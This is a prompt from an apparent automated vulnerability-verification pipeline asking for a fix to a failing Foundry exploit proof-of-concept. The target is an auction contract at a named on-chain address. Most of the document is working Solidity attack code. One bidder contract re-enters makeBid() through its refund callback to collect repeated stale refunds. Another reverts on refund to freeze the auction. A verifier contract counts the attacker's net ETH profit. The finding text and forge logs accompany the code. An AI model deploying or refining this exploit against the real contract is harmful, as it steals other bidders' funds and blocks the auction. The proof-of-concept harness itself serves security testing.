You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Previous-bid refund is an unguarded external call that enables both reentrancy theft and auction lockup
- claim: `makeBid()` refunds the current `bidAddress` via `_sendEther()` before updating `bidAddress` and `bidEther`, and the whole bid reverts if that refund fails. Because the refund is a raw call, the incumbent bidder can reenter `makeBid()` while the old bid state is still in place, or simply revert to block all later bids.
- impact: A malicious highest-bidder contract can repeatedly collect refunds against the same stale `bidEther`, draining value from later bidders and leaving the auction undercollateralized. The same push-refund pattern also lets a reverting bidder permanently prevent anyone from outbidding them, so the NFT can be won cheaply or the auction can be frozen entirely.
- exploit_paths: ["Attacker becomes highest bidder from a contract; when a victim later calls `makeBid()`, the refund callback reenters `makeBid()` before `bidAddress`/`bidEther` are updated and receives additional payouts based on the stale bid.", "Attacker becomes highest bidder from a contract whose fallback always reverts; every later `makeBid()` attempt reverts inside `_sendEther()`, so no one can replace the attacker."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

interface IGameAuction {
    function isAuction() external view returns (bool);
    function isAuctionEnd() external view returns (bool);
    function isGameEnd() external view returns (bool);
    function bidAddress() external view returns (address);
    function bidEther() external view returns (uint256);
    function newBidEtherMin() external view returns (uint256);
    function makeBid() external payable;
}

contract SimpleBidder {
    IGameAuction internal immutable game;
    address internal immutable verifier;

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    constructor(IGameAuction game_, address verifier_) payable {
        game = game_;
        verifier = verifier_;
    }

    receive() external payable {}

    function bid(uint256 amount) external payable onlyVerifier {
        require(msg.value == amount, "bad value");
        game.makeBid{value: amount}();
    }

    function attemptBid(
        uint256 amount
    ) external payable onlyVerifier returns (bool success, bytes memory data) {
        require(msg.value == amount, "bad value");
        (success, data) = address(game).call{value: amount}(
            abi.encodeWithSelector(IGameAuction.makeBid.selector)
        );
    }

    function sweep() external onlyVerifier {
        (bool sent, ) = payable(verifier).call{value: address(this).balance}("");
        require(sent, "sweep failed");
    }
}

contract ReentrantBidder {
    IGameAuction internal immutable game;
    address internal immutable verifier;
    uint256 internal reentryBidAmount;
    uint256 internal reentriesRemaining;
    bool internal armed;

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    constructor(IGameAuction game_, address verifier_) payable {
        game = game_;
        verifier = verifier_;
    }

    receive() external payable {
        if (
            msg.sender == address(game) &&
            armed &&
            reentriesRemaining != 0 &&
            address(this).balance >= reentryBidAmount
        ) {
            unchecked {
                --reentriesRemaining;
            }
            game.makeBid{value: reentryBidAmount}();
        }
    }

    function configureReentry(
        uint256 reentryBidAmount_,
        uint256 reentriesRemaining_,
        bool armed_
    ) external onlyVerifier {
        reentryBidAmount = reentryBidAmount_;
        reentriesRemaining = reentriesRemaining_;
        armed = armed_;
    }

    function bid(uint256 amount) external payable onlyVerifier {
        require(msg.value == amount, "bad value");
        game.makeBid{value: amount}();
    }

    function sweep() external onlyVerifier {
        (bool sent, ) = payable(verifier).call{value: address(this).balance}("");
        require(sent, "sweep failed");
    }
}

contract RevertingBidder {
    IGameAuction internal immutable game;
    address internal immutable verifier;

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    constructor(IGameAuction game_, address verifier_) payable {
        game = game_;
        verifier = verifier_;
    }

    receive() external payable {
        revert("refund blocked");
    }

    function bid(uint256 amount) external payable onlyVerifier {
        require(msg.value == amount, "bad value");
        game.makeBid{value: amount}();
    }
}

contract FlawVerifier {
    IGameAuction public constant TARGET =
        IGameAuction(0x52d69c67536f55EfEfe02941868e5e762538dBD6);

    ReentrantBidder internal immutable reentrantBidder;
    RevertingBidder internal immutable revertingBidder;
    SimpleBidder internal immutable helperBidder;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public originalHypothesisValidated;
    bool public originalHypothesisRefuted;
    bool public profitAchieved;
    bool public reentrancyPathExecuted;
    bool public reentrancyPathProfitable;
    bool public lockupPathExecuted;
    string public exploitPathUsed;

    constructor() payable {
        reentrantBidder = new ReentrantBidder(TARGET, address(this));
        revertingBidder = new RevertingBidder(TARGET, address(this));
        helperBidder = new SimpleBidder(TARGET, address(this));
        _profitToken = address(0);
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external payable {
        uint256 baselineBalance = address(this).balance - msg.value;

        require(TARGET.isGameEnd(), "game has not ended");
        require(TARGET.isAuction(), "auction inactive");
        require(!TARGET.isAuctionEnd(), "auction already ended");

        bool profitableReentrancy = _attemptDirectProfitPath(baselineBalance);

        if (!lockupPathExecuted) {
            _attemptLockupPath();
        }

        _finalize(baselineBalance);

        if (!profitAchieved && !originalHypothesisValidated) {
            originalHypothesisRefuted = true;
        }

        if (!profitableReentrancy && !reentrancyPathExecuted) {
            // A self-funded replay only becomes net-profitable if the live game
            // already holds enough third-party ETH surplus beyond bidEther, or if
            // an honest later bidder supplies the replacement bid. The harness
            // controls only verifier-funded transactions, so this path is skipped
            // when the on-chain balance cannot cover the stale-refund drain.
        }
    }

    function _attemptDirectProfitPath(
        uint256 baselineBalance
    ) internal returns (bool) {
        uint256 attackBid = _minOutbid(TARGET.bidEther());
        uint256 reentryBid = _minOutbid(attackBid);
        uint256 minVictimBid = _minOutbid(attackBid);

        uint256 gameBalance = address(TARGET).balance;
        uint256 currentBid = TARGET.bidEther();
        uint256 surplus = gameBalance > currentBid ? gameBalance - currentBid : 0;

        uint256 victimBid = minVictimBid;
        if (surplus + victimBid + reentryBid < attackBid) {
            victimBid = attackBid - surplus - reentryBid;
            if (victimBid < minVictimBid) {
                victimBid = minVictimBid;
            }
        }

        if (address(this).balance < attackBid + victimBid) {
            return false;
        }

        if (attackBid <= victimBid + reentryBid) {
            // With only verifier-funded bids, the victim leg costs at least as much
            // as the stale refund that can be stolen. Without pre-existing third-
            // party ETH in the auction balance, this path cannot show positive net
            // profit in a closed harness.
            return false;
        }

        address incumbentBefore = TARGET.bidAddress();

        (bool initialBidOk, ) = address(reentrantBidder).call{value: attackBid}(
            abi.encodeWithSelector(ReentrantBidder.bid.selector, attackBid)
        );

        if (!initialBidOk) {
            if (TARGET.bidAddress() == incumbentBefore) {
                originalHypothesisValidated = true;
                lockupPathExecuted = true;
                exploitPathUsed = "existing incumbent already blocks refunds";
            }
            return false;
        }

        reentrantBidder.configureReentry(reentryBid, 1, true);

        (bool victimBidOk, ) = address(helperBidder).call{value: victimBid}(
            abi.encodeWithSelector(SimpleBidder.bid.selector, victimBid)
        );

        reentrantBidder.configureReentry(0, 0, false);
        reentrantBidder.sweep();
        helperBidder.sweep();

        if (!victimBidOk) {
            return false;
        }

        reentrancyPathExecuted = true;
        originalHypothesisValidated = true;

        if (address(this).balance > baselineBalance) {
            reentrancyPathProfitable = true;
            exploitPathUsed = "reentrancy theft via stale refund";
            return true;
        }

        return false;
    }

    function _attemptLockupPath() internal returns (bool) {
        uint256 lockBid = _minOutbid(TARGET.bidEther());
        if (address(this).balance < lockBid) {
            return false;
        }

        address incumbentBefore = TARGET.bidAddress();

        (bool lockBidOk, ) = address(revertingBidder).call{value: lockBid}(
            abi.encodeWithSelector(RevertingBidder.bid.selector, lockBid)
        );

        if (!lockBidOk) {
            if (TARGET.bidAddress() == incumbentBefore) {
                originalHypothesisValidated = true;
                lockupPathExecuted = true;
                exploitPathUsed = "existing incumbent already blocks refunds";
                return true;
            }
            return false;
        }

        uint256 challengerBid = _minOutbid(lockBid);
        if (address(this).balance < challengerBid) {
            return false;
        }

        (bool challengerOk, ) = helperBidder.attemptBid{value: challengerBid}(
            challengerBid
        );
        helperBidder.sweep();

        if (!challengerOk) {
            lockupPathExecuted = true;
            originalHypothesisValidated = true;
            if (bytes(exploitPathUsed).length == 0) {
                exploitPathUsed = "auction lockup via reverting refund";
            }
            return true;
        }

        return false;
    }

    function _finalize(uint256 baselineBalance) internal {
        if (address(this).balance > baselineBalance) {
            unchecked {
                _profitAmount = address(this).balance - baselineBalance;
            }
            profitAchieved = true;
            if (bytes(exploitPathUsed).length == 0) {
                exploitPathUsed = "direct profit";
            }
        } else {
            _profitAmount = 0;
        }
    }

    function _minOutbid(uint256 currentBid) internal pure returns (uint256) {
        return (currentBid * 5) / 100 + 1;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.00s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 14588)
Traces:
  [14588] FlawVerifierTest::testExploit()
    ├─ [2323] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [5765] FlawVerifier::executeOnOpportunity()
    │   ├─ [2504] 0x52d69c67536f55EfEfe02941868e5e762538dBD6::isGameEnd() [staticcall]
    │   │   └─ ← [Return] false
    │   └─ ← [Revert] game has not ended
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 12.69s (1.05s CPU time)

Ran 1 test suite in 12.70s (12.69s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 14588)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
